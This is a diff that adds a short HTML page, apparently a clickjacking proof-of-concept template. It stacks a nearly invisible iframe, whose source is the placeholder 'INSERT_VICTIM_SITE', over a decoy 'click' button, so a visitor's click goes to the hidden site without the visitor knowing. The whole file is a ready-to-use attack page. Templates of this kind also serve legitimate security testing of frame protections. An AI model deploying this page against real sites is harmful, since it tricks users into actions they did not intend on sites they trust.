@@ -1,0 +1,24 @@
+<head>
+	<style>
+		#victim_website {
+			position:relative;
+			width:500px;
+			height:700px;
+			z-index:2;
+                        opacity:0.000001;
+			}
+		#decoy_div {
+			position:absolute;
+			left:100px;
+			top:495px;
+			z-index:1;
+			}
+	</style>
+</head>
+<body>
+	<div id="decoy_div">
+	<button>click</button>
+	</div>
+	<iframe id="victim_website" src="INSERT_VICTIM_SITE">
+	</iframe>
+</body>
